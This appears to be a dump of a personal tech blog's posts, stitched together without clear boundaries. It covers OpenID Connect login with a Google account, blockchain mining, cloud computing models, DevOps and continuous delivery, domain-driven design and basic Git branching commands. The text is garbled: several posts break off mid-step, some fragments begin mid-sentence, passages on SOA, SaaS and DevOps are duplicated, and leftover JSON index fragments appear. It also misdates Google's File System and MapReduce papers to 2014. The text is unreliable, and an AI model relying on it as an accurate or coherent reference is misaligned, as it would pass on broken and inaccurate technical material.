The standard is controlled by the OpenID Foundation. This blog post will go through an example to use your google account to login a Node.js app by using OpenID Connect. Table of Contents Authentication vs Authorization 'Jargon' explanations OpenID OAuth OpenID Connect Setup Google Account Setup Node.Js App Authentication vs Authorization Authentication and Authorization are big topics, this blog only touches the basic and will have follow-up blogs to explain the details. If you are still confused about the difference between authentication and authorization, the followings are the explanations. Authentication: is the process of ascertaining that somebody really is who he claims to be. Authorization: refers to rules that determine who is allowed to do what. 'Jargon' explanations If you are confused about the difference between various protocols, e.g. OpenID, OAuth, OpenID Connect, don't worry. It is a common challenge to most people. OpenID Authentication is delegated: Server A wants to authenticate user U, but U's credentials (e.g. U's name and password) are sent to another server, B, that A trusts (at least, trusts for authenticating users). Indeed, server B makes sure that U is indeed U, and then tells to A: \"ok, that's the genuine U\". OAuth Authorization is delegated: Entity A obtains from entity B an \"access right\" which A can show to server S to be granted access; B can thus deliver temporary, specific access keys to A without giving them too much power. You can imagine an OAuth server as the key master in a big hotel; he gives to employees keys which open the doors of the rooms that they are supposed to enter, but each key is limited (it does not give access to all rooms); furthermore, the keys self-destruct after a few hours. OpenID Connect To some extent, authorization can be abused into some pseudo-authentication, on the basis that if entity A obtains from B an access key through OAuth, and shows it to server S, then server S may infer that B authenticated A before granting the access key. So some people use OAuth where they should be using OpenID. This schema may or may not be enlightening; but I think this pseudo-authentication is more confusing than anything. OpenID Connect does just that: it abuses OAuth into an authentication protocol. In the hotel analogy: if I encounter a purported employee and that person shows me that he has a key which opens my room, then I suppose that this is a true employee, on the basis that the key master would not have given him a key which opens my room if he was not. OpenID Connect standardize how authentication with OAuth2 works OpenID connect is built on top of Oauth 2.0 it contains authorization code flow and implicit flow standard scopes and claims token type is JWT (Json web token) ID token UserInfo endpoint Simple Supports multiple Relying Party (client) types Optional: encryption, discovery, dynamic client registration & session management http://openid.net/connect Setup Google Account Since this blog uses google account to do the login, so let's setup the account first. Go to the following URL: https://console.developers.google.com/apis/credentials Create credential Create OAuth client id Ensure the redirect URL is setup correctly, e.g. http://localhost:5000/oidc-client-sample.html This redirect URL will be used in the next chapter. Test the google authentication first by using auth0.com: https://auth0.com/docs/connections/social/google If your manage to connect to the google account, then it's time to move to the next chapter. Setup Node.Js App In this blog, the focus in on OpenID Connect, then we will not build Node.JS app from scratch.

Private key must be kept as secret. When users send money from one account to another account, transaction will be created. Transaction using users' private key to generate signature. People uses public key to verify the transaction is not tampered. Besides the normal users, there is another role called miner. Miner Miners keeps track of the transactions Receive transactions Group transactions to form a new block Hash previous block + hash new block + random number Puzzle hash: Very compute intensive; Are rewarded for finding the number Miners work continuously The purpose of puzzle hash is to grantee the 'Proof of Work'. In order to get the reward, miners need to compete to resolve a random has puzzle which can only be handled by many tries without shortcut. The blockchain is protected from modification because the hash-puzzle takes (on average) about a one-hundred-billion-billion attempts to find \u2014 it\u2019s more work the any individual is capable of producing.

for Dummy Published: Sep 04, 2017 Tags: cloud Category: ComputerScience This is a blog to explain what cloud is to dummies. Table of Contents Introduction Five main principles of cloud computing: Pooled resources: Available to any subscribing users Virtualization: High utilization of hardware assets Elasticity: Dynamic scale without CAPEX Automation: Build, deploy, configure, provision, and move, all without manual intervention Metered billing: Per-usage business model; pay only for what you use The cloud offers the illusion of infinite resources, available on demand. You no longer need to play the guessing game of how many users need to be supported and how scalable the application is. The cloud takes care of the peaks and troughs of utilization times. In the world of the cloud, you pay for only the resources you use, when you use them. This is the revolutionary change: the ability to handle scale without paying a premium. In this realm of true utility computing, resource utilization mirrors the way we consume electricity or water. Deployment models Application deployment models: CAPEX (up-front capital expenditure) vs OPEX (ongoing operational costs) Cloud ready If you can answer \u201cyes\u201d to some or all of the following questions, you may be cloud-ready: Do you have automated scripts for setting up the operating system and installing all necessary software? Do you package your software in such a way that all the configuration files are bundled with the binary artifacts, ready for one-click deployment? Do you run your software stack inside of virtual machines that can be cloned? Are common maintenance tasks (such as vacuuming the database, announcing maintenance windows, and backing up data) happening automatically or easily automated with a single click? Is your software designed to scale horizontally by adding new web servers or other machines? Cloud evolution On the software side of the cloud evolution are three important threads of development: virtualization SOA SaaS Two of these are technological, and the third relates to the business model. SOA We see SOA as the logical extension of browser-based standardization applied to machine-to-machine communication. Things that humans did through browsers that interacted with a web server are now done machine-to-machine using the same web-based standard protocols and are called SOA. SOA makes practical the componentization and composition of services into applications, and hence it can serve as the architectural model for building composite applications running on multiple virtualized instances. SOA is a precursor to the cloud. Distributed loosely coupled systems, which formed the basis for SOA, are by now widely used by virtually every organization with an active web presence. A remote service publishes its interface (via a WSDL), and a consuming service has to abide by that interface to consume the service. Each SOA building block can play one or both of two roles: service provider or service consumer. The Universal Description Discovery and Integration (UDDI) specification defines a way to publish and discover information about web services. Other service broker technologies include (for example) Electronic Business using eXtensible Markup Language (ebXML). Whichever service the service consumers need, they have to take it into the brokers, bind it with respective service, and then use it. Putting this more simplistically, SOA is all about the process of defining an IT solution or architecture, whereas cloud computing is an architectural alternative. We can say that SOA can\u2019t be replaced by cloud computing. Most cloud computing solutions are defined through SOA. They don\u2019t compete\u2014they\u2019re complementary notions. SaaS The final software evolution we consider most pertinent to the cloud is SaaS. Historically, enterprise software was sold predominantly in a perpetual license model. In this model, a customer purchased the right to use a certain software application in perpetuity for a fixed, and in many cases high, price. In subsequent years, they paid for support and maintenance at typically around 18 percent of the original price. This entitled the customer to upgrades of the software and help when they ran into difficulty. In the SaaS model, you don\u2019t purchase the software\u2014you rent it. Typically, the fee scales with the amount of use, so the value derived from the software is proportional to the amount spent on it. The customer buys access to the software for a specified term, which may be days, weeks, months, or years, and can elect to stop paying when they no longer need the SaaS offering. Cloud computing service providers have adopted this pay-as-you-go or on-demand model. XaaS You may hear a lot of XaaS like IaaS, PaaS, SaaS, FaaS. One metaphors to explain the idea is Pizza service. On the left side (On Premises), you have full control on every step but you have to care all of them. On the right side (SaaS), you do not need to care about all the details but you also have no control of them. Mainly you just as it is. The same rule applies to real cloud services. Infrastructure as a Service (IaaS) The lowest level of XaaS is known as IaaS, or sometimes as Hardware as a Service (HaaS). A good example of IaaS is the Amazon Elastic Compute Cloud (EC2). A user of IaaS is operating at the lowest level of granularity available and with the least amount of prepackaged functionality. An IaaS provider supplies virtual machine images of different operating system flavors. These images can be tailored by the developer to run any custom or packaged application. These applications can run natively on the chosen OS and can be saved for a particular purpose. The user can bring online and use instances of these virtual machine images when needed. Use of these images is typically metered and charged in hour-long increments. Storage and bandwidth are also consumable commodities in an IaaS environment, with storage typically charged per gigabyte per month and bandwidth charged for transit into and out of the system. IaaS provides great flexibility and control over the cloud resources being consumed, but typically more work is required of the developer to operate effectively in the environment. Platform as a Service (PaaS) PaaS\u2019s fundamental billing quantities are somewhat similar to those of IaaS: consumption of CPU, bandwidth, and storage operates under similar models. Examples of PaaS include Google AppEngine and Microsoft Azure. The main difference is that PaaS requires less interaction with the bare metal of the system. You don\u2019t need to directly interact with or administer the virtual OSs. Instead, you can let the platform abstract away that interaction and concentrate specifically on writing the application. This simplification generally comes at the cost of less flexibility and the requirement to code in the specific languages supported by the particular PaaS provider. Software as a Service (SaaS) and Framework as a Service (FaaS) SaaS, as described earlier in the chapter, refers to services and applications that are available on an on-demand basis. Salesforce.com is an example. FaaS is an environment adjunct to a SaaS offering and allows developers to extend the prebuilt functionality of the SaaS applications. Force.com is an example of a FaaS that extends the Salesforce.com SaaS offering. FaaS offerings are useful specifically for augmenting and enhancing the capabilities of the base SaaS system. You can use FaaS for creating either custom, specialized applications for a specific organization, or general-purpose applications that can be made available to any customer of the SaaS offering. Like a PaaS environment, a developer in a FaaS environment can only use the specific languages and APIs provided by the FaaS. Benefits and Risks of SaaS Benefits: Faster deployment: because no local installation is required Usage-based pricing: letting you pay only for what you use Less financial risk: with lower up-front cost and try-before-you-buy options Reduced need for on-premises resources: such as servers and IT staff Easier upgrades: with no on-premises software to update Risks: Requires trusting a SaaS provider: for availability and data security Can raise legal/regulatory concerns: with storing data outside customer premises Can limit customization: if customers share a multi-tenant application Can be harder to integrate with on-premises applications Can have lower performance than on-premises applications Benefits and Risks of SaaS Software Vendors Benefits: Offers potential to reach new customers in broader markets Can sell directly to business decision maker without going through IT Can provide more predictable revenue than traditional licensing Can lower support costs due to shared multi-tenant applications Provides more knowledge about how customers use the application Risks: Must demonstrate real value up front, due to try-before-you-buy option Revenue builds up more slowly because of typical SaaS pricing models May lessen ability to sell customization services due to multi-tenant applications Can bring new sales challenges, e.g. customer resistance to the cloud Requires significant business changes, e.g. pricing and sales Private and Hybrid clouds For some users, they may resistant to go public cloud for some reasons. Then private or Hybrid clouds are relevant to them. Private clouds Private clouds are a variant of generic cloud computing where internal data-center resources of an enterprise or organization aren\u2019t made available to the general public Benefits: Faster deployment of VMs and applications, because the process is automated Reduced administrative costs, because more of the process is automated Fewer deployment errors, due to automated deployment of standard services Easier cost management, with per-VM chargeback or showback Risks: VM administrators find it hard to trust users to deploy their own VMs and applications VM administrators might resist having part of their job automated Defining standard services can be challenging, since users want different things Changing operational process is hard for risk-averse IT departments Hybrid clouds Hybrid clouds combine private and public clouds. VMWare, Microsoft, HP, OpenStack, Abiquo have support for private/hybrid cloud solution. MapReduce History: Google publish the document of 'Google File System' and MapReduce in 2014. Then Apache project is to make an open source implementation about it. The name MapReduce has its roots in functional programming, inspired by the map and reduce functions first called out in the programming language Lisp. In Lisp, a map takes as input a function and a sequence of values. It then applies the function to each value in the sequence. A reduce combines all the elements of a sequence using a binary operation. For example, it may use + to add all the elements in a sequence. MapReduce implementations are sophisticated frameworks for reliable parallel processing in a highly distributed fashion. They specifically allow distributed processing of the map and reduce functions. Provided all map functions are independent of each other, all maps can be done in parallel. The key is any dependencies in the data set. There may in practice be limitations caused by the data source and/or number of CPUs near that data. The set of reducers operating on the same key produced by the map operations can perform the reduction phase in parallel as well. One of the copies of the program is special: the master. The rest are workers assigned work by the master. The master picks idle workers and assigns each one a map task or a reduce task. Other important concepts Power usage effectiveness (PUE) Power usage effectiveness (PUE) is a metric used to determine the energy efficiency of a data center. Representational State Transfer (REST) REST-style architectures consist of clients and servers. Clients initiate requests to servers; server s process requests and return appropriate responses. Requests and responses are built around the transfer of representations of resources. A resource can be any coherent and meaningful concept that may be addressed. A representation of a resource is typically a document that captures the current or intended state of a resource. Conforming to the REST constraints is referred to as being RESTful. RESTful means conforming to the REST model of an architecture consisting of clients and servers, where clients initiate requests to servers and servers process requests and return appropriate responses. Scalability Scalability is about the cloud platform being able to handle an increased load of users working on a cloud application. Elasticity is the ability of the cloud platform to scale up or down based on need without disrupting the business. Without this, the economies of moving a business/application to the cloud don\u2019t make sense. Database sharding Basic database sharding partitions the database based on who will access that part of the services.

Things that humans did through browsers that interacted with a web server are now done machine-to-machine using the same web-based standard protocols and are called SOA. SOA makes practical the componentization and composition of services into applications, and hence it can serve as the architectural model for building composite applications running on multiple virtualized instances. SOA is a precursor to the cloud. Distributed loosely coupled systems, which formed the basis for SOA, are by now widely used by virtually every organization with an active web presence. A remote service publishes its interface (via a WSDL), and a consuming service has to abide by that interface to consume the service. Each SOA building block can play one or both of two roles: service provider or service consumer. The Universal Description Discovery and Integration (UDDI) specification defines a way to publish and discover information about web services. Other service broker technologies include (for example) Electronic Business using eXtensible Markup Language (ebXML). Whichever service the service consumers need, they have to take it into the brokers, bind it with respective service, and then use it. Putting this more simplistically, SOA is all about the process of defining an IT solution or architecture, whereas cloud computing is an architectural alternative. We can say that SOA can\u2019t be replaced by cloud computing. Most cloud computing solutions are defined through SOA.

Historically, enterprise software was sold predominantly in a perpetual license model. In this model, a customer purchased the right to use a certain software application in perpetuity for a fixed, and in many cases high, price.

This entitled the customer to upgrades of the software and help when they ran into difficulty. In the SaaS model, you don\u2019t purchase the software\u2014you rent it. Typically, the fee scales with the amount of use, so the value derived from the software is proportional to the amount spent on it. The customer buys access to the software for a specified term, which may be days, weeks, months, or years, and can elect to stop paying when they no longer need the SaaS offering.

An IaaS provider supplies virtual machine images of different operating system flavors. These images can be tailored by the developer to run any custom or packaged application. These applications can run natively on the chosen OS and can be saved for a particular purpose. The user can bring online and use instances of these virtual machine images when needed. Use of these images is typically metered and charged in hour-long increments. Storage and bandwidth are also consumable commodities in an IaaS environment, with storage typically charged per gigabyte per month and bandwidth charged for transit into and out of the system.

Table of Contents DevOps DevOps is a software development and delivery process that emphasizes communication and collaboration between product management, software development, and operations professionals. It supports this by automating and monitoring the process of software integration, testing, deployment, and infrastructure changes by establishing a culture and environment where building, testing, and releasing software can happen rapidly, frequently, and more reliably. Development teams are incentivized to deliver software as rapidly as possible, whereas operations teams aim for stability. DevOps strives to bring these two into one team. The key of DevOps is to Add value and Improve flow. Relationship with Lean Lean has the following principles: Focus on customer value Eliminate waste Reduce cycle time Shared learning Avoid batching Theory of constraints DevOps emphasize on the followings: Culture Automation Monitoring Sharing DevOps is the result of implementing Lean principles to IT value stream. -- Gene Kim DevOps encourage culture changes, and emphasize the followings: Empowerment Accountability Teamwork Reorgnization Organizations which design systems... are constrained to produce designs which are copies of the communication structures of these organizations. -- Conway's law Specialist encourage silos.

Tools Use the right tool is important for DevOps, for DevOps there are tools to cover the whole life cycle.

Puppet/Chef/etc are fully integrated stacks - and they're proprietary stacks Microsoft isn't pushing DSC as a fully integrated stack. DSC is just the bottom layer that accepts a configuration and implements it. Puppet Labs could absolutely design their product to turn Puppet scripts into the MOF file that DSC needs. Continuous Delivery We want to deliver software often and deliver value to customers quicker. Continuous Delivery is important. Anti patterns Deploying software manually Deploying to a production-like-environment only after development is complete (staging) Manual configuration management of production environment The principles, practices, and techniques are aimed at making release boring. Deployment pipeline The deployment pipeline: Commit Stage: Compile, Unit test, Analysis, Build installer Automated acceptance testing Automated capacity testing Manual testing: Showcases, Exploratory testing Release Ideally, a commit stage should take less than five minutes to run, and certainly no more than ten The aim of the deployment pipeline is threefold: It makes every part of the process of building, deploying, testing and releasing software visible to everybody involved, aiding collaboration It improves feedback so that problems are identified and so resolved, as early in the process as possible It enables teams to deploy and release any version of their software to any environment at will through a fully automated process Any stages that deploy the binaries to a production-like environment for manual testing or release purposes should require you to press a button in order to select the version to deploy, and this capability will usually require authorization. The deployment pipeline implementation you create should record every time a process starts and finishes, and what the exact changes were that went through each stage of your process. We need to automate the deployment pipeline gradually over time. If it hurts, do it more frequently, and bring the pain forward. More frequent releases lead to lower risk in putting out any particular release Create a script for each stage in your deployment pipeline Manage changes A working software can be decomposed into four categories: executable code, configuration, host environment, and data. If any of them changes, the behavior changes. Therefore we need to keep all these four of these components under control and ensure that a change in any one of them is verified. Configuration management of every application should be planned as part of project inception. Automate test suite Automated Test Suite Two stages: Compile the software, run your suite of unit tests, create deployable binary (Commit stage) Take the binaries from first stage and run acceptance tests, integration tests, performance tests concurrently Make sure that the automated tests, including smoke tests can be run on developer machines. Test automation pyramid - Mike Cohn Acceptance testing The goal of the acceptance test stage is to assert that the system delivers the value the customer is expecting and that it meets the acceptance criteria. The reality is that the whole team owns the acceptance tests Acceptance tests should be expressed in the language of the business, not in the language of the technology of the application. Acceptance criteria: Given, When, Then Test implementation layer: code uses domain language; no reference to UI elements Application driver layer: understands how to interact with the application to perform actions and return results The objective of acceptance testing is to prove that our application does what the customer meant it to, not that it works the way its programmers think it should. An application written with testability in mind will have an API that both the GUI and the test harness can talk to in order to drive the application. Non-functional requirement While in an ideal world everyone wants their systems to be highly secure, very high performance, massively flexible, extremely scalable, easy to use, easy to support, and simple to develop and maintain, in reality every one of these characteristics comes at a cost. Every architecture involves some trade-off between nonfunctional requirements - hence the Software Engineering Institute's Architecture Tradeoff Analysis Model (ATAM) designed to help teams decide upon a suitable architecture by a thorough analysis of its NFR (nonfunctional requirement, referred to as 'quality attributes') Here are some types of measurements that can be performed: Scalability testing. How do the response time of an individual request and the number of possible simultaneous users change as we add more servers, services, or threads? Longevity testing. This involves running the system for a long time to see if the performance changes over a protracted period of operation. This type of testing can catch memory leaks or stability problems Throughput testing. How many transactions, or messages, or page hits per second can the system handle? Load testing. What happens to capacity when the load on the application increases to production-like proportions and beyond? This is perhaps the most common class of capacity testing. Capacity testing. Is one of the few situations where virtualisation is not appropriate (unless your production environment is virtual) because of the performance overhead it introduces Distributed version control system The core characteristic of a distributed version control system (DVCSs) is that every repository contains the entire history of the project, which means that no repository is privileged except by convention. In the GitHub model, contributors are made by first forking the repository of the project you wish to contribute to, making your changes, and then asking the owners of the original repository to pull your changes. A particular release of the software could come from any of the forks, provided it passed all the tests and was accepted by the project leaders. DVCSs can be extremely effective as part of a traditional continuous integration system, in which there is designated central repository to which everybody regularly pushes their changes. Brach by feature This pattern is designed to make it easier for large teams to work simultaneously on features while keeping mainline in a releasable state. Every story or feature is developed on a separate branch. Only after a story is accepted by testers, it is merged to mainline so as to ensure that mainline is always releasable. Prerequisites: Any changes from mainline must be merged onto every branch on a daily basis Branches must be short-lived, ideally less than a few days, never more than an iteration The number of active branches that exist at any time must be limited to the number of stories in play. Nobody should start a new branch unless the branch representing their previous story is merged back to mainline. Consider having testers accept stories before they are merged. Only allow developers to merge to trunk once a story has been accepted Refactorings must be merged immediately to minimize merge conflicts. This constraint is important but can be painful, and further limits the utility of this pattern Part of the technical lead's role is to be responsible for keeping the trunk releasable. The tech lead should review all merges, perhaps in patch form. The tech lead has the right to reject patches that may potentially break the trunk. Give developers ownership At some organizations, there are teams of specialists who are experts at the creation of effective, modular build pipelines and the management of the environments in which they run. Run-of-the-mill changes, such as adding new libraries, configuration files, and so on, should be performed by developers and operations people working together as they find the need to do so. This kind of activity should not be done by a build specialist, except perhaps in the very early days of a project when the team is working to establish the build. We consider it a failure if we got to the point where only those specialists can maintain the CI system. The expertise of specialists is not to be undervalued, but their goal should be to establish good structures, patterns, and use of technology, and to transfer their knowledge to the delivery team. Once these ground rules are established, their specialist expertise should only be needed for significant structural shifts, not regular day-to-day build maintenance. Roll back It is essential to be able to roll back a deployment in case it goes wrong. Two important constraints: Data, if your release process makes changes to your data, it can be hard to roll back. The other systems you integrate with. With releases involving more than one system (known as orchestrated releases), the rollback process becomes more complex too. Rolling back by redeploying the previous good version Transitional deployment is important if something goes wrong and want to 'roll back'. Release experience Release a new version of software installed by users on their own machines: Managing and upgrade experience Migrating binaries, data, and configuration Testing the upgrade process Getting crash report from users 3 approaches: Let software check update and prompt the users to download and upgrade to the new version Download in the background and prompt for installation Download in the background and silently upgrade the next time the application is restarted So in fact, giving users a choice simply tells them that the developers have no confidence in the upgrade process. Don't delete the old files, move them Essential practices The essential practices include: Don't check in on a broken build Always run all commit tests locally before committing, or get your CI server to do it for you: Pretested commit, personal build, or preflight build (supported by modern CI) Wait for commit tests to pass before moving on Never go home on a broken build Always be prepared to revert to the previous revision Time-box fixing before reverting Don't comment out failing tests Take responsibility for all breakages that result from your changes Deploying user stories Stories are the unit of work for building the product Stories should be tested as soon as they are finished Stories can be deployed as soon as they are tested Stories may be deployed in batch in order to reduce overhead CI/CD: Only build your binaries once Automate deployment (easy rollback) Deploy the same way to every environment Smoke test your deployments Deploy into a copy of production If any part of the pipeline fails, stop the line Other practices What we end up with is (in lean parlance) a pull system: Book: Lean software development: An Agile Toolkit Implementing Lean Software Development: From Concept to Cash Visualize the release status through Release dashboard Zero-downtime releases Canary release: Rolling back easily A/B testing Check capacity requirements gradually Written by Binwei@Oslo","title":"DevOps and Continuous Delivery"},{"location":"2017/devops_and_continuous_delivery/#devops-and-continuous-delivery","text":"Published: Sep 01, 2017 Tags: booknotes, process, devops, continuousdelivery Category: ComputerScience DevOps and continuous delivery are two hot topics these days, which play more and more important role in software development especially for the SaaS (Software as a Service) solution.","title":"DevOps and Continuous Delivery"},{"location":"2017/devops_and_continuous_delivery/#table-of-contents","text":"","title":"Table of Contents"},{"location":"2017/devops_and_continuous_delivery/#devops","text":"DevOps is a software development and delivery process that emphasizes communication and collaboration between product management, software development, and operations professionals.

How do the response time of an individual request and the number of possible simultaneous users change as we add more servers, services, or threads? Longevity testing.

Prerequisites: Any changes from mainline must be merged onto every branch on a daily basis Branches must be short-lived, ideally less than a few days, never more than an iteration The number of active branches that exist at any time must be limited to the number of stories in play. Nobody should start a new branch unless the branch representing their previous story is merged back to mainline. Consider having testers accept stories before they are merged. Only allow developers to merge to trunk once a story has been accepted Refactorings must be merged immediately to minimize merge conflicts. This constraint is important but can be painful, and further limits the utility of this pattern Part of the technical lead's role is to be responsible for keeping the trunk releasable.

The philosophy of DDD is about placing our attention at the heart of the application, focusing on the complexity that is intrinsic to the business domain itself. In using DDD, you are meant to work closely with a domain expert who can explain how the real-world system works. It also acts as the conceptual foundation for the design of the software itself - how it's broken down into objects or functions. In this blog post, I will cover the key elements of DDD. Table of Contents Concepts Domain Domain: a sphere of knowledge or activity Problem domain: the specific problem the software you're working on is trying to solve. Core domain: the key differentiator for the customer's business something they must do well and cannot outsource. We distinguish the core domain (unique to the business) from the supporting sub-domains (typically generic in nature, such as money or time), and place appropriately more of our design efforts on the core. Model With DDD we\u2019re looking to create models of a problem domain. A system of abstractions that describes selected aspects of a domain and can be used to solve problems related to that domain. Context Context: The setting in which a word or statement appears that determines its meaning. Statements about a model can only be understood in a context. Whenever we discuss a model it\u2019s always within some context. This context can usually be inferred from the set of end-users that use the system. Bounded Context In those younger days we were advised to build a unified model of the entire business, but DDD recognizes that we've learned that \"total unification of the domain model for a large system will not be feasible or cost-effective\" Bounded Context: A description of a boundary (typically a subsystem, or the work of a specific team) within which a particular model is defined and applicable. Every domain model lives in precisely one BC, and a BC contains precisely one domain model. BC is a specific responsibility, with explicit boundaries that separate it from other parts of the system. Explicitly define the context within which a model applies\u2026Keep the model strictly consistent within these bounds, but don't be distracted or confused by issues outside. --Eric Evans If we know there are two BCs interacting with each other, then we know we must take care to translate between the concepts in one domain and those of the other. Difference between sub-domains & Bounded context: Sub-domain is a problem space concept. Bounded context is a solution space concept. Ubiquitous language Used throughout that context from conversations to code Ubiquitous language per bounded context For example, in the e-commerce system, the term customer must have multiple meanings. When a user is browsing the catalog, customer means one thing, but when a user is placing an order, it means something else. Practices Context Mapping The process of identifying bounded contexts and their relationships to one another. DDD suggests that we draw up a context map to identify our BCs and those on which we depend or are depended, identifying the nature of these dependencies All this talk about context maps and BCs is sometimes called strategic DDD. After all, figuring out the relationship between BCs is all pretty political when you think about it: which upstream systems will my system depend on, is it easy for me to integrate with them, do I have leverage over them, do I trust them? And the same holds true downstream: which systems will be using my services, how do I expose my functionality as services, will they have leverage over me? Misunderstand this and your application could easily be a failure. Relationship between BCs Published language: the interacting BCs agree on a common a language (for example a bunch of XML schemas over an enterprise service bus) by which they can interact with each other; Open host service: a BC specifies a protocol (for example a RESTful web service) by which any other BC can use its services; Shared kernel: two BCs use a common kernel of code (for example a library) as a common lingua-franca, but otherwise do their other stuff in their own specific way; Customer/supplier: one BC uses the services of another and is a stakeholder (customer) of that other BC. As such it can influence the services provided by that BC; Conformist: one BC uses the services of another but is not a stakeholder to that other BC. As such it uses \"as-is\" (conforms to) the protocols or APIs provided by that BC; Anti-corruption layer: one BC uses the services of another and is not a stakeholder, but aims to minimize impact from changes in the BC it depends on by introducing a set of adapters \u2013 an anti-corruption layer. Anemic and Rich Domain Models Anemic Domain Model: Model with classes focused on state management. Good for CRUD. Rich Domain Model: Model with logic focused on behavior, not just state Preferred for DDD Building blocks Entity A mutable class with an identity (not tied to it's property values) used for tracking and persistence. Value Objects An immutable class whose identity is dependent on the combination of its value Measures, quantifies, or describes a thing in the domain Identity is based on composition of values Immutable Compared using all values No side effects It may surprise you to learn that we should strive to model using Value Object instead of Entities wherever possible. Value Objects are a really good place to put methods and logic \u2026 a better place than entities. -- Eric Evans Domain Services Important operations that don't belong to a particular Entity or Value Object Good Domain Services: * Not a nature part of an Entity or Value Object * Have an interface defined in terms of other domain model elements * Are stateless (but may have side effects) Aggregate Aggregate is a domain pattern used to define object ownership and boundaries. An aggregate is a cluster of associated objects that we treat as a unit for the purpose of data changes. Tips: Aggregates can connect only by the root Ref object to another object by using id can avoid cascading change problem. Don't overlook using FKs for non-root entities. Too many FKs to non-root entities may suggest a problem Rule of cascading deletes: If the root is deleted and removed from memory, all the other objects from the aggregate will be deleted too, because there is no other object holding reference to any of them. It is possible for the root to pass transient references of internal objects to external ones, with the condition that the external objects do not hold the reference after the operation is finished. One simple way to do that is to pass copies of the Value Objects to external objects. Factory Factory is to create new objects and don't care about persistence. Repository Repository is to find and update existing objects which can use a factory to create its objects. Repository can also handle persistence. A repository represents all objects of certain type as a conceptual set\u2026 like a collection with more elaborate querying capability Repository, the purpose of which is to encapsulate all the logic needed to obtain object references. The domain objects won\u2019t have to deal with the infrastructure to get the needed references to other objects of the domain. They will just get them from the Repository and the model is regaining its clarity and focus. Domain event An object that is used to record a discrete event related to model activity within the system. While all events within the system could be tracked, a domain event is only created for event types which the domain experts care about. Benefits and Drawbacks of DDD Benefits of DDD: Flexible Customer's vision/perspective of the problem Path through a very complex problem Well-organized and easily tested code Business logic lives in one place Many great patterns to leverage Drawbacks of DDD: Time and Effort Discuss & model the problem with domain experts Isolate domain logic from other parts of application Learning curve New principles New patterns New processes Only makes sense when there is complexity in the problem Not just CRUD or data-driven applications Not just technical complexity without business domain complexity Team or Company Buy-in to DDD Reference Web sites: Domainlanguage.com http://dddcommunity.org/ Navigation Map: Written by Binwei@Gdynia","title":"Domain Driven Design: Introduction"},{"location":"2017/domain_driven_design_introduction/#domain-driven-design-introduction","text":"Published: Jun 19, 2017 Tags: architecture, process Category: ComputerScience Domain Driven Design (DDD) is about trying to make your software a model of a real-world system or process.

Git is very strong at handling branches, no matter on functionality or on efficiency. Let's try out the Git branch commands. Table of Contents Create Branch git branch f1 The command will create a new branch called f1. Compared to 'classical' version control system, git will not create a separate folder for new branch. All the branches 'share' the same folder on your file system. git checkout f1 git checkout command will switch from current branch to f1 branch. f1 becomes your current branch, your followings changes will happen on f1. HEAD is the 'pointer' which point to the current commit, which also indicates what is the current branch. When you switch a branch, the data in repository does not change. It is the HEAD switch to the different commit. And also copy the files from repository to index, working area. If you are confused about the term: commit, index, and working area, please check my previous blogs: git_getting-started git_areas git checkout -b f2 The above command will quickly create a new branch f2 and switch to this new branch. Visualisation of History In order to have a clear picture of the current repository, the branching situation, and what is the current branch status, you can simply use the following command: git log --oneline --all --decorate --graph You will see console output like following: * 660caea (HEAD -> feature2) f2 | * 90e5174 (feature4, feature3) feature 3 changes |/ | * cf54ec8 (feature1) modification from feature1 | | * a51f214 (master) Merge branch 'feature2' | | |\\ | |/ / | | / | |/ |/| * | bb32dd5 commit feature2 | * 0ac3396 commit feature1 | * 3fb48f2 feature1 first commit |/ * d3033b2 Add more file and change main.txt * 6b07c39 First commit The numbers are the short version hash for commits. For simplicity, you can regard these numbers as commit id now. From the output, you can see how many branches are in current repository and their relationship. The commit HEAD point to means the current branch. The above command is cumbersome to type, you can use git alias in stead. git config --global alias.loadg \"log --oneline --all --decorate --graph\" It will create an alias 'loadg' for the long parameters. Then you can simply type to get the history graph: git loadg The alias data will be added into ~/.gitconfig in following format. You can also add the alias manually in this file. [alias] loadg = log --oneline --all --decorate --graph With this command, you can see the graph and understand repository branching situation easily. Other Basic Commands Branch can also be created from the hash number. git branch f3 66ocaea This command will create a new branch f3 based on the commit which has hash number 66ocaea. git branch -m f3 f4 The command will rename branch f3 to f4. git branch -d f4 The command will delete the branch f4. git diff f2 f3 This command shows the difference between two branches. Summary This blog only covers the basic branch commands, e.g. create a new branch, modify the branch, view the branch status. Still not touch the real power of git branch. In next blog, I will show how to do the merge, rebase and other advance branch commands.

After run this command, you can check the status by git status and use git add/commit to check-in the changes. If f1 and current branch have changes on same files, conflict will happen in the git merge command. Git will present the conflicts directly in the files, see following example: <<<<<<< HEAD current change ======= greeting from f1 >>>>>>> f1 You can use text editor tool to resolve the conflict manually or you can use git mergetool to resolve the conflict. Rebase Branch In most cases, git branch is created based on an existing branch by using git branch command. Then the newly created branch has relationship with the existing branch. If we want to change the relationship, e.g. let the current branch base on another branch, then you need to use the rebase command. git rebase f2 This command will rebase your current branch on branch f2. Cherry Pick Sometimes, if you only want to integrate one specific commit from one branch into current branch, then you can use cherry pick command. git cherry-pick 0ac3396 The above command will integrate the specific commit: 0ac3396 into the current branch. If you call merge/rebase command after cherry pick, git will understand the changes and will not re-apply the unnecessary changes.

Let's start the 'Git journey' by using the basic commands. Table of Contents Install Git First, go to Git download page: https://git-scm.com/downloads Download and install the git on your operating system. Initialize Repository In order to use Git, you need to initialize a local repository first. mkdir FirstRepo cd FirstRepo git init The folder and file operation commands will be slightly different depends on your operating system. A hidden .git folder should be created by the above command. You can use ls -a to verify it. Check Status git status is a handy command to check the current repository status. It is recommended it is used from time to time. If you use git status now, the console output will be: On branch master Inital commit nothing to commit (create/copy files and use \"git add\" to track) Add Files Let's add some example files and folders in the repository. mkdir SubFolder touch main.txt touch SubFolder\\sub.txt Use tree command to verify that two files and one folder are created in the repository. . \u251c\u2500\u2500 SubFolder \u2502 \u2514\u2500\u2500 sub.txt \u2514\u2500\u2500 main.txt Type git status again, and the console output should tell you that there are 'untracked files'. Commit to Local Repository Go to the repository root folder, and run git add . Type git status and you can see from console output that there are changes to be committed and no untracked files. (If you run the above command in sub folder, then only the files under subfolders will be tracked) Run git commit command to commit the change to local repository, and you will encounter a vi look-like program to ask you provide the description for the up-comming commit. Type i and go into text edit mode; write down the description for the commit, like 'First commit'; then press Esc and :wq to save and quit that vi look like program. If everything goes well, you will see that files are commit and git status will tell that nothing to commit, and working directory clean. Commit to Remote Repository In order to collaborate with other developers, you need to publish the repository to a remote repository or a center repository like GitHub. Now go to GitHub do the registration, create a repository on GitHub, and get the git URL of the repository. The URL looks like: https://github.com/{username}/{repositoryname}.git Use the following command to 'push' your local repository to the Github: git push --set-upstream 